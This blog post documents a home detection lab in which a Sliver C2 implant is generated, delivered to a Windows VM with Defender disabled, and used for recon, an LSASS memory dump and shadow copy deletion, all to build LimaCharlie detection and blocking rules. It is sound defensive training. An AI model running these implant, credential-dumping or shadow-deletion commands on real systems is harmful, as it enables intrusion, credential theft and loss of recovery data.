---
title: Home Lab Setup: Threat Detection With LimaCharlie EDR
date: 2025-03-02
categories: [SOC, EDR, LAB]
tags: [soc, edr, lab]     # TAG names should always be lowercase
image:
  path: https://i.ibb.co/My0g9WyH/edr.jpg
---

In this post, I’ll walk you through my home lab setup, where I generate a C2 payload and analyze its behavior using LimaCharlie as my EDR solution. We’ll simulate a real-world attack scenario, monitor endpoint activity, and leverage threat-hunting techniques to detect and respond to malicious behavior.

For this setup, I’m using two VM machines -

- **Attacker Machine**: Ubuntu VM for launching attacks.
- **Victim Machine**: Windows VM monitored by EDR.

# Setting up attacker machine

![ubuntu-vm](https://i.ibb.co/jkZ4pBzG/Ubuntu-64-bit-2025-02-18-21-07-05.png)

### setting up a static IP address (optional)

change the interface from DHCPv4 to Manual.

![enter image description here](https://i.ibb.co/XgGXLwf/Ubuntu-64-bit-2025-02-18-21-31-22.png)

Edit IPV4 method to manual

![enter image dejkscription here](https://i.ibb.co/chVyn5Hk/Ubuntu-64-bit-2025-02-18-21-33-10.png)

![enter image description here](https://i.ibb.co/BKSTFr2R/Ubuntu-64-bit-2025-02-18-21-33-17.png)

Get the required values from VMware virtual network editor. add '/24' to the end of subnet IP.

![enter image description here](https://i.ibb.co/C3xVvK3Y/Ubuntu-64-bit-2025-02-18-21-33-56.png)

Select install openssh server

![enter image description here](https://i.ibb.co/WNYthctp/Ubuntu-64-bit-2025-02-18-21-34-54.png)

![enter image description here](https://i.ibb.co/VYPHj5Vg/Ubuntu-64-bit-2025-02-18-21-35-47.png)

# Setting up victim machine

### Disabling Windows Defefnder

I am using [sorums defender control](https://www.sordum.org/9480/defender-control-v2-1/) to disable windows defender or you can disable it manually

This will prevent vm from going to sleep mode

```powershell
powercfg /change standby-timeout-ac 0
powercfg /change standby-timeout-dc 0
powercfg /change monitor-timeout-ac 0
powercfg /change monitor-timeout-dc 0
powercfg /change hibernate-timeout-ac 0
powercfg /change hibernate-timeout-dc 0
```

### **Installing Sysmon for Advanced Logging**

```powershell
Invoke-WebRequest -Uri https://download.sysinternals.com/files/Sysmon.zip -OutFile C:\Windows\Temp\Sysmon.zip
Expand-Archive -LiteralPath C:\Windows\Temp\Sysmon.zip -DestinationPath C:\Windows\Temp\Sysmon
```

![enter image description here](https://i.ibb.co/svzg1Nkv/Windows-10-x64-2-2025-02-18-22-46-33.png)

### **Configuring Sysmon**

We’ll use **SwiftOnSecurity’s** Sysmon configuration:

```powershell
Invoke-WebRequest -Uri https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml -OutFile C:\Windows\Temp\Sysmon\sysmonconfig.xml
C:\Windows\Temp\Sysmon\Sysmon64.exe -accepteula -i C:\Windows\Temp\Sysmon\sysmonconfig.xml
```

![enter image description here](https://i.ibb.co/b5bNRWM9/Windows-10-x64-2-2025-02-18-22-47-49.png)

![enter image description here](https://i.ibb.co/SXS8FgTB/Windows-10-x64-2-2025-02-18-22-48-24.png)

### Verify Sysmon is Running

![enter image description here](https://i.ibb.co/4ZNX6Zch/Windows-10-x64-2-2025-02-18-22-48-50.png)

![enter image description here](https://i.ibb.co/mr2rGRZ8/Windows-10-x64-2-2025-02-18-22-49-48.png)

### Install LimaCharlie EDR on Windows VM

### **Create Free LimaCharlie Account**

- Sign up at **LimaCharlie.io**
- Create an **Organization**

![enter image description here](https://i.ibb.co/ns9T9kx1/Firefox-Screenshot-2025-02-18-T17-44-17-198-Z.png)

- **Add Sensor**:
  - Select **Windows**
  - Choose **x86-64 (.exe) sensor**

![enter image description here](https://i.ibb.co/bgKPCPWB/Firefox-Screenshot-2025-02-18-T17-45-20-280-Z.png)

![enter image description here](https://i.ibb.co/rRfCPVzp/Firefox-Screenshot-2025-02-18-T17-46-45-082-Z.png)

![enter image description here](https://i.ibb.co/v4x8D7Pt/Firefox-Screenshot-2025-02-18-T17-47-31-807-Z.png)

![enter image description here](https://i.ibb.co/SDLTsMNz/Firefox-Screenshot-2025-02-18-T17-47-46-113-Z.png)

- Open **PowerShell** in administrator mode and install the sensor application

```powershell
cd C:\Users\User\Downloads
Invoke-WebRequest -Uri https://downloads.limacharlie.io/sensor/windows/64 -Outfile C:\Users\User\Downloads\lc_sensor.exe cmd.exe
```

- Copy the **LimaCharlie installation command** and run it in **Command Prompt**.
- When the sensor is successful installed it with show in the web UI.

![enter image description here](https://i.ibb.co/HTHrpNvs/sensor-vertify.png)

### **Enable Sysmon Log Collection**

- In **LimaCharlie Web UI**, go to **Artifact Collection**
- Click **Add Rule** → Enter:
  - **Name**: `windows-sysmon-logs`
  - **Platform**: Windows
  - **Path Pattern**: `wel://Microsoft-Windows-Sysmon/Operational:*`
  - **Retention**: 10 days
- Click **Save Rule**

![enter image description here](https://i.ibb.co/1tSJT6h4/Firefox-Screenshot-2025-02-20-T05-54-38-284-Z.png)

---
# Process

## **1. Installing Sliver**

### **SSH into Ubuntu VM**

It is much easy if we use a ssh client to connect to the Ubuntu VM because it will give us more control over the shell.

```bash
ssh user@[Linux_VM_IP]
```

### **Install Sliver C2 Framework**

This will install Sliver C2 framework .

```bash
sudo su
wget https://github.com/BishopFox/sliver/releases/download/v1.5.34/sliver-server_linux -O /usr/local/bin/sliver-server
chmod +x /usr/local/bin/sliver-server
apt install -y mingw-w64
mkdir -p /opt/sliver
```

![enter image description here](https://i.ibb.co/YBwPyKDv/kali-linux-2024-1-vmware-amd64-2025-02-20-11-51-50.png)

## **2. Generating the C2 Payload**

We will use **Sliver C2** to generate the payload .

### **Accessing the Linux VM**

1.  Login into the linux shell and switch to the root user:

    `sudo su`

2.  Change the directory to the Sliver installation directory:

    `cd /opt/sliver`

3.  Start the Sliver C2 server:

    `sliver-server`

### **Creating the Payload**

4.  Generate the C2 payload using the Ubuntu VM’s static IP address which we setuped at the beginning

    `generate --http [Linux_VM_IP] --save /opt/sliver`

![enter image description here](https://i.ibb.co/PzTzVnpx/generate-payload.png)

5.  Verify the the implant which we created:

    `implants`

6.  Exit Sliver for now:

    `exit`

## **3. Transferring the Payload to the Windows VM**

I am using a python http server to transfer the C2 payload from our linux machine to Windows VM .

### **Hosting the Payload on the Linux VM**

1.  Start a simple HTTP server on the Linux VM:

    ```bash
    cd /opt/sliver
    python3 -m http.server 80
    ```

### **Downloading the Payload on the Windows VM**

2.  Open an **Administrative PowerShell Console** on the Windows VM.
3.  Download the C2 payload from the Linux VM:

```powershell
 IWR -Uri http://[Linux_VM_IP]/[payload_name].exe -o Outfile C:\Users\User\Downloads\[payload_name].exe
```

    -   Replace `[Linux_VM_IP]` with the Linux VM’s IP address.
    -   Replace `[payload_name].exe` with the actual payload filename.

![enter image description here](https://i.ibb.co/xSnd1ZMQ/request-2.png)

---

## **4. Establishing a C2 Session**

### **Preparing the Listener on the Linux VM**

1.  Stop the Python web server and drop into the silver server:

    `Ctrl + C`

    `sliver-server`

2.  Start a HTTP listener:

    `http`

![enter image description here](https://i.ibb.co/zVhf3htC/http.png)

### **Executing the Payload on the Windows VM**

4.  Execute the payload from an **Administrative PowerShell console**

    `C:\Users\User\Downloads\[payload_name].exe`

### **Confirming the Connection on the Linux VM**

5.  If the payload successfully executed a session id will appear in our shell , Check if any session has been established:

    `sessions`

6.  Connect to the active session with the session id:

    `use [session_id]`

![enter image description here](https://i.ibb.co/JwQS4f2f/session.png)

# **Gathering System Information**

Now that the C2 session is established, we will gather system information to simulate an attacker’s reconnaissance activities.

### **System Reconnaissance Commands**

- **Get basic system details about the session:**

  `info`

![inf](https://i.ibb.co/vCXWZrXn/info.png)

- **Check user privileges:**

  `whoami`

  `getprivs`

If you successfully executed the payload with the admin rights you will see some additional permissions

![getprivs](https://i.ibb.co/wrF6FZxG/whoami.png)

- **Find the current working directory:**

  `pwd`

![pwd](https://i.ibb.co/DfZMrHPW/pwd.png)

- **List active network connections:**

  `netstat`

![netstat](https://i.ibb.co/mFbQpTSJ/netstat.png)

- **List running processes:**

  `ps -T`

![processes](https://i.ibb.co/cKxG9T0n/ps-T.png)

    -   Sliver highlights its own process in **green** and detected security tools in **red**.

# Observing our EDR Telemetry

## **1. Setting Up LimaCharlie for Telemetry Analysis**

Before diving into telemetry, ensure your **Windows VM sensor** is active in LimaCharlie:

- Navigate to the **LimaCharlie Web UI**.
- Click **"Sensors"** on the left menu.
- Select your active **Windows sensor** to access real-time system data.

---

## **2. Process Monitoring in LimaCharlie**

One of the key aspects of EDR is process monitoring. Attackers often use malicious or compromised processes to establish persistence and execute payloads.

### **Viewing Running Processes**

- In the **sensor menu**, click **“Processes”** to open the process tree.
- Look for **unsigned processes**, which could indicate suspicious activity.
- Hover over icons to see additional details such as **digital signatures, parent-child relationships, and process execution details**.

![enter image description here](https://i.ibb.co/svHD8SSv/processos-1.png)

### **Identifying Suspicious Processes**

- **Malicious implants often appear as unsigned processes.**
- LimaCharlie highlights security-related processes in **red** and its own monitoring process in **green**.
- Compare process behaviors against known legitimate system processes using resources like **EchoTrail** or the **SANS Hunt Evil poster**.

[SANS Hunt Evil Poster](https://www.sans.org/posters/hunt-evil/)

![enter image description here](https://i.ibb.co/SDM8HHd3/processos-2.png)

![enter image description here](https://i.ibb.co/Zz6BpVPS/process-network.png)

## **3. Analyzing Network Activity**

### **Checking Network Connections**

- Navigate to the **“Network” tab** in the sensor menu.
- Use **Ctrl+F** to search for known Indicators of Compromise (IoCs), such as:
  - The **name of the C2 implant**.
  - The **IP address** of the C2 server.
- Look for **unexpected outbound connections** to unfamiliar IPs, especially those associated with **non-standard ports**.

![network](https://i.ibb.co/0yf49Mqb/network.png)

### **Identifying Suspicious Network Behavior**

- A **new or unknown process communicating externally** is a red flag.
- A process making **frequent connections to an external IP** might indicate **beaconing behavior**.
- Compare connection logs with threat intelligence feeds to determine if an external IP is associated with known threats.

---

## **4. Investigating File System Activity**

Many attacks involve **dropping, modifying, or executing malicious files**. Monitoring the **file system** helps detect these changes.

### **Finding Suspicious Files**

- Go to the **"File System"** tab in LimaCharlie.
- Navigate to directories where suspicious files were recently executed (e.g., `C:\Users\User\Downloads`).
- Locate the **C2 implant file** or any unusual executables.

![file-system](https://i.ibb.co/VW7z8ZMp/file-system.png)

### **Verifying File Integrity with VirusTotal**

- Use LimaCharlie’s **"Scan with VirusTotal"** feature.
- This checks the file’s **hash** against VirusTotal’s database to see if it’s flagged as malicious.
- If **"Item not found"**, it may be a **new or custom-built malware sample**: an indicator of targeted attacks.

![vthash](https://i.ibb.co/S7rv2kBq/virustotal.png)

## **5. Examining the Timeline for Event Correlation**

The **"Timeline"** feature in LimaCharlie provides a **real-time stream of security events** and system activities.

### **Filtering and Searching for Threat Indicators**

- Use **filters** to focus on events related to:
  - **New process executions.**
  - **Network connections.**
  - **File modifications.**
- Identify when the **C2 implant was created, executed, and connected to an external IP**.

### **Tracking an Attack Sequence**

- Look for a **chain of events** leading to execution (e.g., file creation → execution → privilege escalation).
- Identify related detections such as **SENSITIVE_PROCESS_ACCESS**, which logs attempts to dump LSASS memory for credential theft.

## **6. Practical Exercise: Detecting a Credential Dumping Attempt**

### **Step 1: Dumping LSASS Memory (Adversarial Action)**

In your **C2 session (Sliver)**, run:

`procdump -n lsass.exe -s lsass.dmp`

![procdump](https://i.ibb.co/BVpH3GcJ/procdump.jpg)

This simulates an attacker attempting to extract credentials from memory.

### **Step 2: Searching for the Event in LimaCharlie**

- In the **Timeline**, filter for **SENSITIVE_PROCESS_ACCESS** events.
- Locate the **process accessing lsass.exe**.
- This provides visibility into **how attackers attempt credential theft**.

![enter image description here](https://i.ibb.co/qYDhN5pH/sensitive-process-access.png)

### **Step 3: Creating a Detection Rule**

To detect this in the future, create a **Detection & Response (D&R) rule**:

Replace the detect section with this

```yaml
event: SENSITIVE_PROCESS_ACCESS
op: ends with
path: event/*/TARGET/FILE_PATH
value: lsass.exe`
```

and the respond section with this

```yaml
- action: report
  name: LSASS access
```

![enter image description here](https://i.ibb.co/cXFhNms3/lsass-rule.png)

- This triggers an alert **whenever LSASS memory is accessed**.
- Go to the **"Detections" tab** to see real-time alerts for similar attacks.

![enter image description here](https://i.ibb.co/NdKknWgm/lsass-rule-test.png)

You can the check the detection rule we built using the `test event` option before saving .

![enter image description here](https://i.ibb.co/Y4sps5VZ/lsass-rule-detection.png)

---

##  **6. Practical Exercise: Detecting Volume Shadow Copy Deletion Attempt**

One common tactic employed by ransomware is the deletion of Volume Shadow Copies to prevent system restoration.

### **Why Focus on Volume Shadow Copy Deletion?**

Volume Shadow Copies allow users to restore files or entire systems to previous states. Ransomware often deletes these copies using commands like:

`vssadmin delete shadows /all`

This command is rarely used in regular operations, making it an excellent candidate for a blocking rule.

### **1. Implementing the Blocking Rule**

To create an effective blocking rule, we first need to generate telemetry by executing the malicious command in a controlled environment.

- **Access the Sliver C2 Session**: Connect to your target session via the Sliver C2 framework.
- **Execute the Command**:

  `shell`

  When prompted with “This action is bad OPSEC, are you an adult?” type `Y` and press Enter.

  `vssadmin delete shadows /all`

![enter image description here](https://i.ibb.co/4g1rdPcj/shell.jpg)

    Note: The command's success is not essential; executing it will generate the necessary telemetry.

### **2. Detect the Activity Using LimaCharlie**

- **Access LimaCharlie**: Navigate to the **Detections** tab to see if any default Sigma rules have flagged the activity.
- **Examine the Detection**: Expand the detection to view metadata and references, which provide insights into why this activity is suspicious.

![shadow-rule](https://i.ibb.co/jZZy2pf5/shadow-rule.png)

### **3. Create a Detection & Response (D&R) Rule**

- **View the Event Timeline**: In LimaCharlie, locate the raw event corresponding to the malicious activity.
- **Craft the D&R Rule**:

  - **Detection Section**: Configure the rule to detect the specific command execution.
  - **Response Section**: Define actions to take upon detection, such as terminating the offending process.

  Example response configuration:

  ```yaml
  - action: report
    name: vss_deletion_kill_it
  - action: task
    command:
      - deny_tree
      - <<routing/parent>>
  ```

  In this configuration:

  - `action: report` generates a detection report.
  - `action: task` with `deny_tree` terminates the parent process responsible for the command.

![enter image description here](https://i.ibb.co/rGWsG788/vss-deletion-kill-it.png)

### **4. Test the Blocking Rule**

- **Re-execute the Malicious Command**: Run the `vssadmin delete shadows /all` command again in the Sliver C2 session.
- **Verify the Response**: The command should trigger the D&R rule, resulting in the termination of the parent process. To confirm, attempt to run another command (e.g., `whoami`). If the session is terminated or unresponsive, the blocking rule is functioning correctly.

![enter image description here](https://i.ibb.co/GvnSpCYQ/vssruleblock.jpg)

That's all for now! Let’s meet again with another interesting lab soon.

![bye](https://i.ibb.co/rgx2Vv9/goingdark.jpg)